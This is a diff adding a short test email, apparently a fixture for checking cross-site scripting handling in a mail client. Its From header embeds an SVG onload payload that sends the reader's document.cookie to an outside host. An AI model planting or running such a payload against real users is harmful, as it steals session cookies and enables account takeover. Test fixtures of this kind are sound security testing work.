@@ -1,0 +1,7 @@
+From: <"test<svg onload='img=new Image();img.src="//x55.me/geo.php?get="+document.cookie;'>@attack.com">
+To: garrick.hill@enron.com, mike.mazowita@enron.com
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
